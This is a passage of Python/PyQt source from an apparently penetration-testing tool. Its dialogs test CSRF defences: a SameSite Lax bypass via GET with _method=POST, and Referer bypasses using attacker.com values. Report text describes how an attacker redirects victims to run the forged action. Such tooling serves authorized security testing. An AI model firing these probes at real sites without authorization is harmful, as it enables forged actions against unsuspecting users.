class SameSiteTesterDialog(QDialog):
    """
    Tests whether the SameSite Lax GET request override (_method=POST) bypass
    works against the target server.

    Sends 2 probes:
      1. Baseline POST  — the original request verbatim
      2. GET Override   — rewritten as GET with body params in the query string
                          plus _method=POST, no body

    Compares status codes & responses to determine whether the bypass is viable.
    """

    _RESULT_COLORS = {
        "Bypassed":  "#ff4c4c",
        "Protected": "#2ecc71",
        "Baseline":  "#5b9bd5",
        "Error":     "#e67e22",
        "Pending":   "#888888",
        "Unknown":   "#aaaaaa",
    }

    def __init__(self, request_info: "RequestInfo", raw_request: str,
                 token_bypass: str = "None", parent=None):
        super().__init__(parent)
        self.setWindowFlag(Qt.Window, True)   # independent, non-modal window
        self.request_info = request_info
        self.raw_request  = raw_request
        self.token_bypass = token_bypass
        self._probes: List[CSRFProbe] = []
        self._worker: Optional[CSRFTesterWorker] = None
        self._selected_row = -1

        self.setWindowTitle("🔬 SameSite Lax Bypass Tester")
        self.setMinimumSize(900, 620)
        self.setStyleSheet(f"""
            QDialog, QWidget {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
            }}
            QTableWidget {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                gridline-color:{COLOR_BORDER};
                border:1px solid {COLOR_BORDER};
            }}
            QTableWidget::item:selected {{
                background:{COLOR_ACCENT}; color:#000;
            }}
            QHeaderView::section {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:4px;
            }}
            QTextEdit {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:3px;
            }}
            QPushButton {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:4px;
                padding:4px 12px;
            }}
            QPushButton:hover {{ border-color:{COLOR_ACCENT}; color:{COLOR_TEXT_BRIGHT}; }}
            QPushButton:disabled {{ color:{COLOR_TEXT_MUTED}; }}
            QTabBar::tab {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:5px 12px;
                margin-right:2px;
            }}
            QTabBar::tab:selected {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};
                border-bottom:2px solid {COLOR_ACCENT};
            }}
        """)

        self._build_probes()
        self._build_ui()
        self._populate_queue()

    # ── Probe construction ──────────────────────────────────────────────────

    def _build_get_override_request(self) -> str:
        """Rewrite the POST request as a GET with body params moved to the query string."""
        ri = self.request_info

        strip_token = self.token_bypass in (
            "Token validation \u2013 Token absent",
            "Token validation \u2013 Request method",
        )

        body_params: List[str] = []
        for part in (ri.body or "").split("&"):
            if not part:
                continue
            k, _, v = part.partition("=")
            if strip_token and CSRFGenerator._is_csrf_token_key(k):
                continue
            body_params.append(f"{k}={v}")

        # Preserve existing query params from the original path
        if "?" in ri.path:
            path_base, existing_qs = ri.path.split("?", 1)
            all_params = ([existing_qs] if existing_qs else []) + body_params + ["_method=POST"]
        else:
            path_base = ri.path
            all_params = body_params + ["_method=POST"]

        new_path = f"{path_base}?{'&'.join(all_params)}"

        # Rebuild headers, dropping body-specific ones
        hdr_lines: List[str] = []
        for k, v in ri.headers.items():
            if k.lower() in ("content-type", "content-length", "transfer-encoding"):
                continue
            hdr_lines.append(f"{k}: {v}")

        raw_get = "GET " + new_path + " HTTP/1.1\r\n"
        raw_get += "\r\n".join(hdr_lines)
        raw_get += "\r\n\r\n"
        return raw_get

    def _build_probes(self):
        """Build the 2-probe sequence: baseline POST + GET override."""
        get_raw = self._build_get_override_request()
        self._probes = [
            CSRFProbe(
                name="1. Baseline POST",
                description="Original POST request sent verbatim — establishes the baseline response.",
                raw_request=self.raw_request,
            ),
            CSRFProbe(
                name="2. SameSite Lax — GET Override (_method=POST)",
                description=(
                    "POST rewritten as GET with all body parameters in the URL query string "
                    "plus _method=POST. Browsers send SameSite=Lax cookies for top-level GET "
                    "navigations, so if the server accepts this the SameSite restriction is bypassed."
                ),
                raw_request=get_raw,
                bypass_hint="Lax \u2013 GET request override (_method=POST)",
            ),
        ]

    # ── UI ──────────────────────────────────────────────────────────────────

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(8)

        # Info banner
        info_lbl = QLabel(
            "Probe 1 sends the original POST request. "
            "Probe 2 rewrites it as a GET with all body params in the URL plus <b>_method=POST</b>. "
            "If the server responds identically (same status / behaviour), the SameSite Lax bypass is viable."
        )
        info_lbl.setWordWrap(True)
        info_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:9pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:6px 8px;"
        )
        root.addWidget(info_lbl)

        # Toolbar
        tb = QHBoxLayout()
        self._run_btn = QPushButton("▶  Run Probes")
        self._run_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:4px 16px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
            f"QPushButton:disabled{{background:{COLOR_BORDER};color:{COLOR_TEXT_MUTED};}}"
        )
        self._run_btn.clicked.connect(self._start_probes)

        self._stop_btn = QPushButton("■  Stop")
        self._stop_btn.setEnabled(False)
        self._stop_btn.clicked.connect(self._stop_probes)

        self._status_lbl = QLabel("Ready — click 'Run Probes' to start")
        self._status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")

        tb.addWidget(self._run_btn)
        tb.addWidget(self._stop_btn)
        tb.addSpacing(12)
        tb.addWidget(self._status_lbl)
        tb.addStretch()
        root.addLayout(tb)

        # Progress bar
        self._progress = QProgressBar()
        self._progress.setFixedHeight(6)
        self._progress.setMaximum(len(self._probes) or 1)
        self._progress.setValue(0)
        self._progress.setTextVisible(False)
        self._progress.setStyleSheet(
            f"QProgressBar{{background:{COLOR_DARK_BG};border:none;border-radius:3px;}}"
            f"QProgressBar::chunk{{background:{COLOR_ACCENT};border-radius:3px;}}"
        )
        root.addWidget(self._progress)

        # Splitter: probe table (top) + detail tabs (bottom)
        splitter = QSplitter(Qt.Vertical)
        splitter.setHandleWidth(5)
        splitter.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        # Probe table
        queue_widget = QWidget()
        queue_layout = QVBoxLayout(queue_widget)
        queue_layout.setContentsMargins(0, 0, 0, 0)
        queue_layout.setSpacing(4)
        queue_lbl = QLabel("Probe Queue")
        queue_lbl.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        queue_layout.addWidget(queue_lbl)

        self._table = QTableWidget(0, 4)
        self._table.setHorizontalHeaderLabels(["#", "Probe Name", "Status", "Result"])
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Fixed)
        self._table.setColumnWidth(0, 32)
        self._table.setColumnWidth(2, 80)
        self._table.setColumnWidth(3, 120)
        self._table.setSelectionBehavior(QTableWidget.SelectRows)
        self._table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._table.verticalHeader().setVisible(False)
        self._table.setAlternatingRowColors(True)
        self._table.itemSelectionChanged.connect(self._on_row_selected)
        queue_layout.addWidget(self._table)
        splitter.addWidget(queue_widget)

        # Detail tabs
        self._tabs = QTabWidget()

        self._req_view = QTextEdit()
        self._req_view.setReadOnly(True)
        self._req_view.setFont(QFont("Consolas", 9))
        self._req_view.setPlaceholderText("Select a probe above to see its request…")
        self._tabs.addTab(self._req_view, "📤 HTTP Request")

        self._resp_view = QTextEdit()
        self._resp_view.setReadOnly(True)
        self._resp_view.setFont(QFont("Consolas", 9))
        self._resp_view.setPlaceholderText("Response will appear here after probe runs…")
        self._tabs.addTab(self._resp_view, "📥 HTTP Response")

        self._summary_view = QTextEdit()
        self._summary_view.setReadOnly(True)
        self._summary_view.setFont(QFont("Consolas", 10))
        self._summary_view.setPlaceholderText("Summary appears here after both probes complete…")
        self._tabs.addTab(self._summary_view, "📊 Summary")

        splitter.addWidget(self._tabs)
        splitter.setSizes([200, 360])
        root.addWidget(splitter)

        # Close button
        close_btn = QPushButton("Close")
        close_btn.setFixedWidth(100)
        close_btn.clicked.connect(self.close)
        btn_row = QHBoxLayout()
        btn_row.addStretch()
        btn_row.addWidget(close_btn)
        root.addLayout(btn_row)

    def _populate_queue(self):
        self._table.setRowCount(len(self._probes))
        for i, probe in enumerate(self._probes):
            num_item = QTableWidgetItem(str(i + 1))
            num_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 0, num_item)
            self._table.setItem(i, 1, QTableWidgetItem(probe.name))
            status_item = QTableWidgetItem("–")
            status_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 2, status_item)
            result_item = QTableWidgetItem("Pending")
            result_item.setForeground(QBrush(QColor(self._RESULT_COLORS["Pending"])))
            self._table.setItem(i, 3, result_item)
        if self._probes:
            self._table.selectRow(0)

    # ── Probe execution ─────────────────────────────────────────────────────

    def _start_probes(self):
        if not self._probes:
            return
        ri = self.request_info
        self._run_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._progress.setMaximum(len(self._probes))
        self._progress.setValue(0)
        self._summary_view.clear()

        # Reset all rows
        for i, probe in enumerate(self._probes):
            self._table.item(i, 2).setText("–")
            self._table.item(i, 3).setText("Pending")
            self._table.item(i, 3).setForeground(
                QBrush(QColor(self._RESULT_COLORS["Pending"])))
            probe.result_label     = "Pending"
            probe.status_code      = 0
            probe.response_body    = ""
            probe.response_headers = ""

        self._worker = CSRFTesterWorker(
            self._probes,
            host        = ri.host,
            port        = ri.port,
            use_ssl     = ri.scheme == "https",
            refresh_cfg = {},
        )
        self._worker.probe_started.connect(self._on_probe_started)
        self._worker.probe_finished.connect(self._on_probe_finished)
        self._worker.all_done.connect(self._on_all_done)
        self._worker.start()

    def _stop_probes(self):
        if self._worker and self._worker.isRunning():
            self._worker.terminate()
            self._worker.wait(1000)
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("Stopped by user.")

    # ── Slots ───────────────────────────────────────────────────────────────

    @pyqtSlot(int)
    def _on_probe_started(self, idx: int):
        self._status_lbl.setText(
            f"Running probe {idx + 1}/{len(self._probes)}: {self._probes[idx].name}")
        self._table.item(idx, 3).setText("Running…")
        self._table.item(idx, 3).setForeground(
            QBrush(QColor(self._RESULT_COLORS["Pending"])))
        self._table.scrollToItem(self._table.item(idx, 0))

    @pyqtSlot(int, object)
    def _on_probe_finished(self, idx: int, probe: CSRFProbe):
        self._progress.setValue(idx + 1)
        # The worker (CSRFTesterWorker.run) already set probe.result_label via
        # _is_success_like(), which correctly treats 400/401/403/405/422/500/501
        # as Protected and handles redirect comparison. Trust it directly.
        status_text = str(probe.status_code) if probe.status_code else "ERR"
        self._table.item(idx, 2).setText(status_text)
        self._table.item(idx, 3).setText(probe.result_label)
        color = self._RESULT_COLORS.get(probe.result_label, "#888")
        self._table.item(idx, 3).setForeground(QBrush(QColor(color)))

        if self._selected_row == idx:
            self._show_probe(probe)

    @pyqtSlot()
    def _on_all_done(self):
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("✓ Both probes complete.")
        self._build_summary()
        self._tabs.setCurrentIndex(2)

    def _on_row_selected(self):
        idx = self._table.currentRow()
        if 0 <= idx < len(self._probes):
            self._selected_row = idx
            self._show_probe(self._probes[idx])

    def _show_probe(self, probe: CSRFProbe):
        self._req_view.setPlainText(probe.raw_request)
        if probe.status_code:
            body = probe.response_body or "(empty body)"
            resp = (
                f"HTTP/1.1 {probe.status_code} {probe.status_text}\n"
                f"{probe.response_headers}\n\n"
                f"── Body ──\n{body}"
            )
        elif probe.error:
            resp = f"[Error]\n{probe.error}"
        else:
            resp = "(Not yet run — click 'Run Probes')"
        self._resp_view.setPlainText(resp)

    # ── Summary ─────────────────────────────────────────────────────────────

    def _build_summary(self):
        baseline = self._probes[0] if len(self._probes) > 0 else None
        override = self._probes[1] if len(self._probes) > 1 else None

        base_code = baseline.status_code if baseline else 0
        over_code = override.status_code if override else 0
        verdict   = override.result_label if override else "Unknown"

        lines: List[str] = [
            "╔" + "═" * 70 + "╗",
            "║  SAMESITE LAX BYPASS TESTER — RESULT REPORT" + " " * 26 + "║",
            "╚" + "═" * 70 + "╝",
            "",
            "TARGET",
            "──────",
            f"  URL    : {self.request_info.url}",
            f"  Method : {self.request_info.method}",
            "",
            "TECHNIQUE",
            "─────────",
            "  Lax – GET request override (_method=POST)",
            "  Body parameters are moved to the URL query string.",
            "  _method=POST is appended so framework routing treats it as POST.",
            "  SameSite=Lax cookies are attached by the browser for top-level GET",
            "  navigations, so no CORS pre-flight or SameSite blocking occurs.",
            "",
            "PROBE RESULTS",
            "─────────────",
        ]

        if baseline:
            base_icon = "🔵"
            lines.append(
                f"  {base_icon} Probe 1 — Baseline POST    : HTTP {base_code} {baseline.status_text}"
            )
        if override:
            over_icon = "🔴" if verdict == "Bypassed" else ("🟢" if verdict == "Protected" else "🟠")
            lines.append(
                f"  {over_icon} Probe 2 — GET Override      : HTTP {over_code} {override.status_text}"
            )

        lines += ["", "VERDICT", "───────"]

        if verdict == "Bypassed":
            lines += [
                "  🔴  BYPASS VIABLE",
                "",
                "  The server returned the same HTTP status for the GET override as for",
                "  the baseline POST. This strongly indicates the server processed the",
                "  action when the request was submitted via GET + _method=POST.",
                "",
                "  WHAT THIS MEANS:",
                "  • The server honours the _method=POST override parameter.",
                "  • SameSite=Lax cookies will be attached by a victim's browser during",
                "    a top-level GET navigation (e.g. window.location redirect).",
                "  • An attacker can host a page that redirects the victim to the",
                "    crafted GET URL and the CSRF action executes silently.",
                "",
                "  NEXT STEP:",
                "  Select 'Lax – GET request override (_method=POST)' in the SameSite",
                "  Bypass dropdown and click 'Generate PoC' to get the full exploit page.",
            ]
        elif verdict == "Protected":
            lines += [
                "  🟢  SERVER APPEARS PROTECTED",
                "",
                f"  Baseline POST returned HTTP {base_code}; GET Override returned HTTP {over_code}.",
                "  The server rejected or processed the GET override differently.",
                "",
                "  Possible reasons:",
                "  • The framework does NOT honour _method=POST.",
                "  • The endpoint enforces strict HTTP method checking.",
                "  • The request requires a body token that is not present in a GET.",
                "  • SameSite=Strict cookies are used instead of Lax.",
                "",
                "  The SameSite Lax GET override bypass is NOT recommended for this target.",
            ]
        elif verdict == "Error":
            lines += [
                "  🟠  CONNECTION ERROR",
                "",
                f"  Could not reach the target (probe returned 0 / connection failure).",
                "  Check that the host/port are correct and the server is reachable.",
            ]
        else:
            lines.append("  Probes have not been run yet.")

        lines += ["", "═" * 72]
        self._summary_view.setPlainText("\n".join(lines))


# ─────────────────────────────────────────────────────────────────────────────
# Referer Header Bypass Tester
# ─────────────────────────────────────────────────────────────────────────────

class RefererTesterDialog(QDialog):
    """
    Tests Referer header bypass techniques against the target server.

    Sends 3 probes:
      1. Baseline          — original request verbatim (establishes expected response)
      2. Referer Absent    — request with the Referer header completely removed
      3. Referer Circumvent — request with Referer set to
                              https://attacker.com?<target-host>
                              so the target domain appears in the query string
    """

    _RESULT_COLORS = {
        "Bypassed":  "#ff4c4c",
        "Protected": "#2ecc71",
        "Baseline":  "#5b9bd5",
        "Error":     "#e67e22",
        "Pending":   "#888888",
        "Unknown":   "#aaaaaa",
    }

    def __init__(self, request_info: "RequestInfo", raw_request: str, parent=None):
        super().__init__(parent)
        self.setWindowFlag(Qt.Window, True)   # independent, non-modal window
        self.request_info = request_info
        self.raw_request  = raw_request
        self._probes: List[CSRFProbe] = []
        self._worker: Optional[CSRFTesterWorker] = None
        self._selected_row = -1

        self.setWindowTitle("\U0001f50e Referer Header Bypass Tester")
        self.setMinimumSize(900, 640)
        self.setStyleSheet(f"""
            QDialog, QWidget {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
            }}
            QTableWidget {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                gridline-color:{COLOR_BORDER};
                border:1px solid {COLOR_BORDER};
            }}
            QTableWidget::item:selected {{
                background:{COLOR_ACCENT}; color:#000;
            }}
            QHeaderView::section {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:4px;
            }}
            QTextEdit {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:3px;
            }}
            QPushButton {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:4px;
                padding:4px 12px;
            }}
            QPushButton:hover {{ border-color:{COLOR_ACCENT}; color:{COLOR_TEXT_BRIGHT}; }}
            QPushButton:disabled {{ color:{COLOR_TEXT_MUTED}; }}
            QTabBar::tab {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:5px 12px;
                margin-right:2px;
            }}
            QTabBar::tab:selected {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};
                border-bottom:2px solid {COLOR_ACCENT};
            }}
        """)

        self._build_probes()
        self._build_ui()
        self._populate_queue()

    # ── Probe construction ──────────────────────────────────────────────────

    @staticmethod
    def _remove_referer(raw: str) -> str:
        """Return raw request with the Referer header line removed."""
        lines = raw.replace("\r\n", "\n").split("\n")
        cleaned = [l for l in lines if not l.lower().startswith("referer:")]
        return "\r\n".join(cleaned)

    @staticmethod
    def _set_referer(raw: str, value: str) -> str:
        """Replace or add a Referer header with the given value."""
        lines = raw.replace("\r\n", "\n").split("\n")
        # Remove any existing Referer line
        lines = [l for l in lines if not l.lower().startswith("referer:")]
        # Insert after request line (first line)
        if lines:
            lines.insert(1, f"Referer: {value}")
        return "\r\n".join(lines)

    def _build_probes(self):
        """Build the 4-probe sequence."""
        ri          = self.request_info
        target_host = ri.host or urllib.parse.urlparse(ri.url).netloc

        # Probe 2: Completely attacker-controlled Referer (checks if any validation exists)
        invalid_referer = "https://attacker.com/csrf-attack"
        invalid_raw     = self._set_referer(self.raw_request, invalid_referer)

        # Probe 3: Referer removed entirely
        absent_raw = self._remove_referer(self.raw_request)

        # Probe 4: Referer contains the target domain in the query string
        # e.g. https://attacker.com?vulnerable-website.com
        circumvent_referer = f"https://attacker.com?{target_host}"
        circumvent_raw     = self._set_referer(self.raw_request, circumvent_referer)

        self._probes = [
            CSRFProbe(
                name="1. Baseline (original Referer)",
                description="Original request sent verbatim — establishes the expected baseline response.",
                raw_request=self.raw_request,
            ),
            CSRFProbe(
                name=f"2. Invalid Referer ({invalid_referer})",
                description=(
                    f"Request with Referer set to '{invalid_referer}' — a completely attacker-controlled URL. "
                    "If the server accepts this, it does not validate the Referer header value at all. "
                    "If it rejects it, validation is active and the bypass techniques (probes 3 & 4) apply."
                ),
                raw_request=invalid_raw,
            ),
            CSRFProbe(
                name="3. Referer Absent (header removed)",
                description=(
                    "Request with the Referer header completely removed. "
                    "If the server accepts this, it validates Referer only when present — "
                    "an attacker can suppress it using <meta name=\"referrer\" content=\"never\">."
                ),
                raw_request=absent_raw,
                bypass_hint="Absent \u2013 Validation depends on header being present",
            ),
            CSRFProbe(
                name=f"4. Referer Circumvent ({circumvent_referer})",
                description=(
                    f"Request with Referer set to '{circumvent_referer}'. "
                    f"The target domain ({target_host}) appears in the query string, "
                    "satisfying naive 'contains own domain' checks. "
                    "Requires Referrer-Policy: unsafe-url response header so browsers "
                    "include the full URL query string in the Referer."
                ),
                raw_request=circumvent_raw,
                bypass_hint="Circumvent \u2013 Validation can be bypassed (query string trick)",
            ),
        ]

    # ── UI ──────────────────────────────────────────────────────────────────

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(8)

        info_lbl = QLabel(
            "<b>Probe 1</b> sends the original request (baseline). "
            "<b>Probe 2</b> replaces the Referer with a fully attacker-controlled URL to check if validation exists at all. "
            "<b>Probe 3</b> removes the Referer header entirely. "
            "<b>Probe 4</b> sets Referer to "
            "<code>https://attacker.com?&lt;target-host&gt;</code> "
            "to test naive \u2018contains own domain\u2019 validation."
        )
        info_lbl.setWordWrap(True)
        info_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:9pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:6px 8px;"
        )
        root.addWidget(info_lbl)

        # Toolbar
        tb = QHBoxLayout()
        self._run_btn = QPushButton("\u25b6  Run Probes")
        self._run_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:4px 16px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
            f"QPushButton:disabled{{background:{COLOR_BORDER};color:{COLOR_TEXT_MUTED};}}"
        )
        self._run_btn.clicked.connect(self._start_probes)

        self._stop_btn = QPushButton("\u25a0  Stop")
        self._stop_btn.setEnabled(False)
        self._stop_btn.clicked.connect(self._stop_probes)

        self._status_lbl = QLabel("Ready \u2014 click \u2018Run Probes\u2019 to start")
        self._status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")

        tb.addWidget(self._run_btn)
        tb.addWidget(self._stop_btn)
        tb.addSpacing(12)
        tb.addWidget(self._status_lbl)
        tb.addStretch()
        root.addLayout(tb)

        # Progress bar
        self._progress = QProgressBar()
        self._progress.setFixedHeight(6)
        self._progress.setMaximum(len(self._probes) or 1)
        self._progress.setValue(0)
        self._progress.setTextVisible(False)
        self._progress.setStyleSheet(
            f"QProgressBar{{background:{COLOR_DARK_BG};border:none;border-radius:3px;}}"
            f"QProgressBar::chunk{{background:{COLOR_ACCENT};border-radius:3px;}}"
        )
        root.addWidget(self._progress)

        # Splitter: probe table (top) + detail tabs (bottom)
        splitter = QSplitter(Qt.Vertical)
        splitter.setHandleWidth(5)
        splitter.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        # Probe table
        queue_widget = QWidget()
        queue_layout = QVBoxLayout(queue_widget)
        queue_layout.setContentsMargins(0, 0, 0, 0)
        queue_layout.setSpacing(4)
        queue_lbl = QLabel("Probe Queue")
        queue_lbl.setStyleSheet(f"color:{COLOR_ACCENT};font-size:9pt;font-weight:bold;")
        queue_layout.addWidget(queue_lbl)

        self._table = QTableWidget(0, 4)
        self._table.setHorizontalHeaderLabels(["#", "Probe Name", "Status", "Result"])
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Fixed)
        self._table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Fixed)
        self._table.setColumnWidth(0, 32)
        self._table.setColumnWidth(2, 80)
        self._table.setColumnWidth(3, 120)
        self._table.setSelectionBehavior(QTableWidget.SelectRows)
        self._table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._table.verticalHeader().setVisible(False)
        self._table.setAlternatingRowColors(True)
        self._table.itemSelectionChanged.connect(self._on_row_selected)
        queue_layout.addWidget(self._table)
        splitter.addWidget(queue_widget)

        # Detail tabs
        self._tabs = QTabWidget()

        self._req_view = QTextEdit()
        self._req_view.setReadOnly(True)
        self._req_view.setFont(QFont("Consolas", 9))
        self._req_view.setPlaceholderText("Select a probe above to see its request\u2026")
        self._tabs.addTab(self._req_view, "\U0001f4e4 HTTP Request")

        self._resp_view = QTextEdit()
        self._resp_view.setReadOnly(True)
        self._resp_view.setFont(QFont("Consolas", 9))
        self._resp_view.setPlaceholderText("Response will appear here after probe runs\u2026")
        self._tabs.addTab(self._resp_view, "\U0001f4e5 HTTP Response")

        self._summary_view = QTextEdit()
        self._summary_view.setReadOnly(True)
        self._summary_view.setFont(QFont("Consolas", 10))
        self._summary_view.setPlaceholderText("Summary appears here after all probes complete\u2026")
        self._tabs.addTab(self._summary_view, "\U0001f4ca Summary")

        splitter.addWidget(self._tabs)
        splitter.setSizes([220, 380])
        root.addWidget(splitter)

        close_btn = QPushButton("Close")
        close_btn.setFixedWidth(100)
        close_btn.clicked.connect(self.close)
        btn_row = QHBoxLayout()
        btn_row.addStretch()
        btn_row.addWidget(close_btn)
        root.addLayout(btn_row)

    def _populate_queue(self):
        self._table.setRowCount(len(self._probes))
        for i, probe in enumerate(self._probes):
            num_item = QTableWidgetItem(str(i + 1))
            num_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 0, num_item)
            self._table.setItem(i, 1, QTableWidgetItem(probe.name))
            status_item = QTableWidgetItem("\u2013")
            status_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 2, status_item)
            result_item = QTableWidgetItem("Pending")
            result_item.setForeground(QBrush(QColor(self._RESULT_COLORS["Pending"])))
            self._table.setItem(i, 3, result_item)
        if self._probes:
            self._table.selectRow(0)

    # ── Probe execution ─────────────────────────────────────────────────────

    def _start_probes(self):
        if not self._probes:
            return
        ri = self.request_info
        self._run_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._progress.setMaximum(len(self._probes))
        self._progress.setValue(0)
        self._summary_view.clear()

        for i, probe in enumerate(self._probes):
            self._table.item(i, 2).setText("\u2013")
            self._table.item(i, 3).setText("Pending")
            self._table.item(i, 3).setForeground(
                QBrush(QColor(self._RESULT_COLORS["Pending"])))
            probe.result_label     = "Pending"
            probe.status_code      = 0
            probe.response_body    = ""
            probe.response_headers = ""

        self._worker = CSRFTesterWorker(
            self._probes,
            host        = ri.host,
            port        = ri.port,
            use_ssl     = ri.scheme == "https",
            refresh_cfg = {},
        )
        self._worker.probe_started.connect(self._on_probe_started)
        self._worker.probe_finished.connect(self._on_probe_finished)
        self._worker.all_done.connect(self._on_all_done)
        self._worker.start()

    def _stop_probes(self):
        if self._worker and self._worker.isRunning():
            self._worker.terminate()
            self._worker.wait(1000)
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("Stopped by user.")

    # ── Slots ───────────────────────────────────────────────────────────────

    @pyqtSlot(int)
    def _on_probe_started(self, idx: int):
        self._status_lbl.setText(
            f"Running probe {idx + 1}/{len(self._probes)}: {self._probes[idx].name}")
        self._table.item(idx, 3).setText("Running\u2026")
        self._table.item(idx, 3).setForeground(
            QBrush(QColor(self._RESULT_COLORS["Pending"])))
        self._table.scrollToItem(self._table.item(idx, 0))

    @pyqtSlot(int, object)
    def _on_probe_finished(self, idx: int, probe: CSRFProbe):
        self._progress.setValue(idx + 1)
        status_text = str(probe.status_code) if probe.status_code else "ERR"
        self._table.item(idx, 2).setText(status_text)
        self._table.item(idx, 3).setText(probe.result_label)
        color = self._RESULT_COLORS.get(probe.result_label, "#888")
        self._table.item(idx, 3).setForeground(QBrush(QColor(color)))
        if self._selected_row == idx:
            self._show_probe(probe)

    @pyqtSlot()
    def _on_all_done(self):
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("\u2713 All probes complete.")
        self._build_summary()
        self._tabs.setCurrentIndex(2)

    def _on_row_selected(self):
        idx = self._table.currentRow()
        if 0 <= idx < len(self._probes):
            self._selected_row = idx
            self._show_probe(self._probes[idx])

    def _show_probe(self, probe: CSRFProbe):
        self._req_view.setPlainText(probe.raw_request)
        if probe.status_code:
            body = probe.response_body or "(empty body)"
            resp = (
                f"HTTP/1.1 {probe.status_code} {probe.status_text}\n"
                f"{probe.response_headers}\n\n"
                f"\u2500\u2500 Body \u2500\u2500\n{body}"
            )
        elif probe.error:
            resp = f"[Error]\n{probe.error}"
        else:
            resp = "(Not yet run \u2014 click \u2018Run Probes\u2019)"
        self._resp_view.setPlainText(resp)

    # ── Summary ─────────────────────────────────────────────────────────────

    def _build_summary(self):
        baseline   = self._probes[0] if len(self._probes) > 0 else None
        invalid    = self._probes[1] if len(self._probes) > 1 else None
        absent     = self._probes[2] if len(self._probes) > 2 else None
        circumvent = self._probes[3] if len(self._probes) > 3 else None

        ri          = self.request_info
        target_host = ri.host or urllib.parse.urlparse(ri.url).netloc

        base_code  = baseline.status_code   if baseline   else 0
        inv_code   = invalid.status_code    if invalid    else 0
        abs_code   = absent.status_code     if absent     else 0
        circ_code  = circumvent.status_code if circumvent else 0

        inv_verdict  = invalid.result_label    if invalid    else "Unknown"
        abs_verdict  = absent.result_label     if absent     else "Unknown"
        circ_verdict = circumvent.result_label if circumvent else "Unknown"

        lines: List[str] = [
            "\u2554" + "\u2550" * 70 + "\u2557",
            "\u2551  REFERER HEADER BYPASS TESTER \u2014 RESULT REPORT" + " " * 24 + "\u2551",
            "\u255a" + "\u2550" * 70 + "\u255d",
            "",
            "TARGET",
            "\u2500" * 6,
            f"  URL    : {ri.url}",
            f"  Method : {ri.method}",
            f"  Host   : {target_host}",
            "",
            "PROBES",
            "\u2500" * 6,
        ]

        if baseline:
            lines.append(
                f"  \U0001f535 Probe 1 \u2014 Baseline (original Referer)     : HTTP {base_code} {baseline.status_text}")
        if invalid:
            icon = "\U0001f534" if inv_verdict == "Bypassed" else ("\U0001f7e2" if inv_verdict == "Protected" else "\U0001f7e0")
            lines.append(
                f"  {icon} Probe 2 \u2014 Invalid Referer (attacker URL) : HTTP {inv_code} {invalid.status_text}")
        if absent:
            icon = "\U0001f534" if abs_verdict == "Bypassed" else ("\U0001f7e2" if abs_verdict == "Protected" else "\U0001f7e0")
            lines.append(
